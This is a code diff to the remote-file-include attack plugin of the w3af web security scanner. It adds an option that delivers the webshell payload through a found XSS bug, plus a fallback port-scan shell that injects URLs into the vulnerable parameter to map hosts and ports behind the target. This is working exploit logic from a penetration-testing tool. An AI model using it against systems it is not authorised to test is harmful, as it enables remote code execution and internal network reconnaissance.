@@ -39,6 +39,7 @@ from core.controllers.misc.get_local_ip import get_local_ip
 
 # Advanced shell stuff
 from core.data.kb.exec_shell import exec_shell as exec_shell
+from core.data.kb.shell import shell as shell
 import plugins.attack.payloads.shell_handler as shell_handler
 from plugins.attack.payloads.decorators.exec_decorator import exec_debug
 
@@ -47,6 +48,10 @@ import core.data.constants.w3afPorts as w3afPorts
 
 import os
 import time
+
+NO_SUCCESS = 0
+SUCCESS_COMPLETE = 1
+SUCCESS_OPEN_PORT = 2
 
 
 class remoteFileIncludeShell(baseAttackPlugin):
@@ -67,7 +72,7 @@ class remoteFileIncludeShell(baseAttackPlugin):
         # User configured variables
         self._listen_port = w3afPorts.REMOTEFILEINCLUDE_SHELL
         self._listen_address = get_local_ip()
-        self._use_XSS_vuln = False
+        self._use_XSS_vuln = True
         self._generateOnlyOne = True
 
     def fastExploit(self, url, method, data ):
@@ -89,8 +94,9 @@ class remoteFileIncludeShell(baseAttackPlugin):
         @parameter vuln_to_exploit: The id of the vulnerability to exploit.
         @return: True if plugin knows how to exploit a found vuln.
         '''
-        if self._listen_address == '' and not self._use_XSS_vuln:
-            msg = 'remoteFileIncludeShell plugin has to be correctly configured to use.'
+        if not self._listen_address and not self._use_XSS_vuln:
+            msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
+            msg += ' that can be reached by the vulnerable Web application.'
             raise w3afException(msg)
         
         rfi_vulns = kb.kb.getData( 'remoteFileInclude' , 'remoteFileInclude' )
@@ -100,10 +106,23 @@ class remoteFileIncludeShell(baseAttackPlugin):
         if len( rfi_vulns ) == 0:
             return False
         else:
-            # Ok, I have the vulnerability to exploit, but... is the plugin configured
-            # in such a way that exploitation is possible?
+            #
+            #    Ok, I have the RFI vulnerability to exploit, but... is the 
+            #    plugin configured in such a way that exploitation is possible?
+            #
             if self._use_XSS_vuln:
-                if len( kb.kb.getData( 'xss' , 'xss' ) ):
+                if not len( kb.kb.getData( 'xss' , 'xss' ) ):
+                    
+                    msg = 'remoteFileIncludeShell plugin is configured to use a XSS bug to'
+                    msg += ' exploit the RFI bug, but no XSS was found.'
+                    om.out.console( msg )
+                    
+                else:
+                    
+                    #
+                    #    I have some XSS vulns, lets see if they have what we need
+                    #
+                    
                     for xss_vuln in kb.kb.getData( 'xss' , 'xss' ):
                         # Set the test string
                         test_string = '<?#@!()&=?>'
@@ -126,18 +145,17 @@ class remoteFileIncludeShell(baseAttackPlugin):
                     # if not, report it to the user
                     if not self._xss_vuln:
                         msg = 'remoteFileIncludeShell plugin is configured to use a XSS'
-                        msg += ' bug to exploit the RFI bug, but no XSS with the required'
-                        msg += ' parameters was found.'
-                        raise w3afException( msg )
-                        
-                # No XSS was found
-                else:
-                    msg = 'remoteFileIncludeShell plugin is configured to use a XSS bug to'
-                    msg += ' exploit the RFI bug, but no XSS was found.'
-                    raise w3afException( msg )
-            else:
-                # Using the good old webserver
-                return True
+                        msg += ' vulnerability to exploit the RFI, but no XSS with the required'
+                        msg += ' capabilities was found.'
+                        om.out.console( msg )
+
+            #    Using the good old webserver (if properly configured)
+            if not self._listen_address:
+                msg = 'You need to specify a local IP address where w3af can bind an HTTP server'
+                msg += ' that can be reached by the vulnerable Web application.'
+                raise w3afException(msg)
+
+            return True
     
     def getAttackType(self):
         '''
@@ -163,7 +181,9 @@ class remoteFileIncludeShell(baseAttackPlugin):
         @return: A shell object based on the vuln that is passed as parameter.
         '''
         # Check if we really can execute commands on the remote server
-        if self._verifyVuln( vuln_obj ):
+        exploit_success = self._verifyVuln( vuln_obj )
+        if exploit_success == SUCCESS_COMPLETE:
+
             # Create the shell object
             shell_obj = rfi_shell( vuln_obj )
             shell_obj.setUrlOpener( self._urlOpener )
@@ -171,6 +191,14 @@ class remoteFileIncludeShell(baseAttackPlugin):
             shell_obj.setWebServer( self._web_server )
             shell_obj.setExploitDc( self._exploit_dc )
             return shell_obj
+        
+        elif exploit_success == SUCCESS_OPEN_PORT:
+
+            # Create the portscan shell object
+            shell_obj = portscan_shell( vuln_obj )
+            shell_obj.setUrlOpener( self._urlOpener )
+            return shell_obj
+
         else:
             return None
 
@@ -187,6 +215,10 @@ class remoteFileIncludeShell(baseAttackPlugin):
         shell_list = shell_handler.get_webshells( extension )
         
         for file_content, real_extension in shell_list:
+            #
+            #    This for loop aims to exploit the RFI vulnerability and get remote
+            #    code execution.
+            #
             if extension == '':
                 extension = real_extension
 
@@ -208,19 +240,38 @@ class remoteFileIncludeShell(baseAttackPlugin):
 
             if successfully_exploited:
                 self._exploit_dc = data_container
-                return successfully_exploited
+                return SUCCESS_COMPLETE
             else:
                 # Remove the file from the local webserver webroot
                 self._clear_web_server( url_to_include )
-                
-        return False
+        
+        else:
+            
+            #
+            #    We get here when it was impossible to create a RFI shell, but we
+            #    still might be able to do some interesting stuff
+            #
+            function_reference = getattr( self._urlOpener , vuln.getMethod() )
+            data_container = vuln.getDc()
+            #    A port that should always be closed,
+            data_container[ vuln.getVar() ] = 'http://www.google.com:92/'   
+
+            try:
+                http_response = function_reference( vuln.getURL(), str(data_container) )
+            except:
+                return False
+            else:
+                if 'failed to open stream' in http_response.getBody():
+                    return SUCCESS_OPEN_PORT
+                    
+        return NO_SUCCESS
     
     def _gen_url_to_include( self, file_content, extension ):
         '''
         Generate the URL to include, based on the configuration it will return a 
         URL poiting to a XSS bug, or a URL poiting to our local webserver.
         '''
-        if self._use_XSS_vuln:
+        if self._use_XSS_vuln and self._xss_vuln:
             url = urlParser.uri2url( self._xss_vuln.getURL() )
             data_container = self._xss_vuln.getDc()
             data_container = data_container.copy()
@@ -347,9 +398,54 @@ class remoteFileIncludeShell(baseAttackPlugin):
             - useXssBug
             - generateOnlyOne
         '''
+
+
+class portscan_shell(shell):
+    '''
+    I create this shell when for some reason I was unable to create the rfi_shell,
+    AND the "include()" method is showing errors, allowing me to determine if a
+    port is open or not. 
+    '''
+    def __init__(self, vuln):
+        '''
+        Create the obj
+        '''
+        shell.__init__(self, vuln)
+        
+    def is_open_port(self, host, port):
+        '''
+        @return: True if the host:port is open.
+        '''
+        port_open_dc = self.getDc()
+        port_open_dc = port_open_dc.copy()
+        port_open_dc[ self.getVar() ] = 'http://%s:%s/' % (host, port)
+                
+        function_reference = getattr( self._urlOpener , self.getMethod() )
+        try:
+            http_response = function_reference( self.getURL(), str(port_open_dc) )
+        except w3afException, w3:
+            return 'Exception from the remote web application: "%s"' % w3
+        except Exception, e:
+            return 'Unhandled exception, "%s"' % e
+        else:
+            if 'HTTP request failed!' in http_response.getBody():
+                #    The port is open but it's not an HTTP daemon
+                return True
+            elif 'failed to open stream' not in http_response.getBody():
+                #    Open port, AND HTTP daemon
+                return True
+            else:
+                return False
+
+    def getName(self):
+        return 'portscan-shell object'
         
 class rfi_shell(exec_shell):
-    
+    '''
+    I create this shell when the remote host allows outgoing connections, or when
+    the attack plugin was configured to use XSS vulnerabilities to exploit the RFI and
+    a XSS vulnerability was actually found.
+    '''
     def __init__(self, vuln):
         '''
         Create the obj
